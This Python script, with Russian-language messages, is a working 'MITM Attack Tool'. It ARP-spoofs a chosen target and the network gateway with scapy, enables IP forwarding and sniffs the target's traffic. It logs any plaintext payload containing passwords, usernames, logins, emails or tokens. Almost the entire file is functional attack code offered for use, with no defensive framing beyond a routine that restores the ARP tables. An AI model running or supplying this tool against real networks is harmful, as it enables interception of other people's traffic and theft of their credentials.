from scapy.all import *
import time
import os
import sys
from threading import Thread
import logging
from colorama import init, Fore
import netifaces
import psutil
import socket

init()


class MITMAttack:
    def __init__(self):
        logging.basicConfig(
            level=logging.INFO,
            format=f'{Fore.GREEN}[%(asctime)s] %(message)s{Fore.RESET}',
            datefmt='%H:%M:%S'
        )
        self.logger = logging.getLogger("MITM")

    def get_active_interface(self):
        addrs = psutil.net_if_addrs()
        stats = psutil.net_if_stats()

        for iface, addr_list in addrs.items():
            if stats[iface].isup and not iface.startswith(('lo', 'vbox', 'docker')):
                for addr in addr_list:
                    if addr.family == socket.AF_INET:
                        self.logger.info(f"Активный интерфейс: {iface} ({addr.address})")
                        return iface
        return None

    def get_default_gateway(self):
        gws = netifaces.gateways()
        default_gw = gws['default'][netifaces.AF_INET][0]
        self.logger.info(f"Шлюз по умолчанию: {default_gw}")
        return default_gw

    def get_target_ip(self):
        while True:
            ip = input(f"{Fore.YELLOW}Введите IP цели: {Fore.RESET}")
            try:
                socket.inet_aton(ip)
                return ip
            except socket.error:
                print(f"{Fore.RED}Некорректный IP адрес{Fore.RESET}")

    def get_mac(self, ip):
        try:
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, verbose=False)
            if ans:
                return ans[0][1].hwsrc
            self.logger.error(f"{Fore.RED}MAC адрес не найден для {ip}{Fore.RESET}")
            return None
        except Exception as e:
            self.logger.error(f"{Fore.RED}Ошибка получения MAC для {ip}: {e}{Fore.RESET}")
            return None

    def arp_spoof(self, target_ip, gateway_ip, target_mac, gateway_mac):
        self.logger.info(f"{Fore.CYAN}ARP-спуфинг запущен{Fore.RESET}")
        packets_sent = 0
        try:
            while True:
                send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip), verbose=False)
                send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip), verbose=False)
                packets_sent += 2
                if packets_sent % 100 == 0:
                    self.logger.info(f"Отправлено ARP пакетов: {packets_sent}")
                time.sleep(2)
        except KeyboardInterrupt:
            self.restore_network(target_ip, gateway_ip, target_mac, gateway_mac)

    def capture_traffic(self, interface, target_ip):
        try:
            self.logger.info(f"{Fore.CYAN}Начало захвата трафика на {interface}...{Fore.RESET}")
            if os.name != 'nt':  # Только для Linux
                os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
            sniff(
                iface=interface,
                filter=f"host {target_ip}",
                prn=self.packet_callback,
                store=False
            )
        except Exception as e:
            self.logger.error(f"{Fore.RED}Ошибка захвата: {e}{Fore.RESET}")

    def packet_callback(self, packet):
        if packet.haslayer(TCP) and packet.haslayer(Raw):
            try:
                load = packet[Raw].load.decode()
                src_ip = packet[IP].src
                dst_ip = packet[IP].dst
                src_port = packet[TCP].sport
                dst_port = packet[TCP].dport

                interesting_data = ['password', 'user', 'login', 'email', 'token']
                if any(word in load.lower() for word in interesting_data):
                    self.logger.info(f"{Fore.YELLOW}Перехвачены данные:{Fore.RESET}")
                    self.logger.info(f"От: {src_ip}:{src_port} -> К: {dst_ip}:{dst_port}")
                    self.logger.info(f"Данные: {load}")
            except:
                pass

    def restore_network(self, target_ip, gateway_ip, target_mac, gateway_mac):
        self.logger.info(f"{Fore.CYAN}Восстановление сети...{Fore.RESET}")
        for _ in range(5):
            send(ARP(
                op=2,
                pdst=gateway_ip,
                hwdst=gateway_mac,
                psrc=target_ip,
                hwsrc=target_mac
            ), verbose=False)
            send(ARP(
                op=2,
                pdst=target_ip,
                hwdst=target_mac,
                psrc=gateway_ip,
                hwsrc=gateway_mac
            ), verbose=False)
        self.logger.info(f"{Fore.GREEN}Сеть восстановлена{Fore.RESET}")

    def start(self):
        if os.name != 'nt' and os.geteuid() != 0:
            print(f"{Fore.RED}Требуются права администратора!{Fore.RESET}")
            sys.exit(1)

        self.logger.info(f"{Fore.CYAN}Инициализация атаки MITM...{Fore.RESET}")

        interface = self.get_active_interface()
        if not interface:
            self.logger.error(f"{Fore.RED}Активный интерфейс не найден{Fore.RESET}")
            sys.exit(1)

        gateway_ip = self.get_default_gateway()
        target_ip = self.get_target_ip()

        self.logger.info(f"{Fore.CYAN}Получение MAC адресов...{Fore.RESET}")
        target_mac = self.get_mac(target_ip)
        gateway_mac = self.get_mac(gateway_ip)

        if not all([target_mac, gateway_mac]):
            self.logger.error(f"{Fore.RED}Не удалось получить MAC адреса{Fore.RESET}")
            sys.exit(1)

        self.logger.info(f"{Fore.GREEN}Настройка завершена:")
        self.logger.info(f"Цель: {target_ip} ({target_mac})")
        self.logger.info(f"Шлюз: {gateway_ip} ({gateway_mac}){Fore.RESET}")

        spoof_thread = Thread(target=self.arp_spoof, args=(target_ip, gateway_ip, target_mac, gateway_mac))
        spoof_thread.daemon = True
        spoof_thread.start()

        try:
            self.capture_traffic(interface, target_ip)
        except KeyboardInterrupt:
            self.restore_network(target_ip, gateway_ip, target_mac, gateway_mac)
            sys.exit(0)


def print_banner():
    banner = f"""
    {Fore.CYAN}
    ╔══════════════════════════════════════╗
    ║           MITM Attack Tool           ║
    ╚══════════════════════════════════════╝
    {Fore.RESET}
    """
    print(banner)


if __name__ == "__main__":
    try:
        print_banner()
        mitm = MITMAttack()
        mitm.start()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}Атака прервана пользователем{Fore.RESET}")
        sys.exit(0)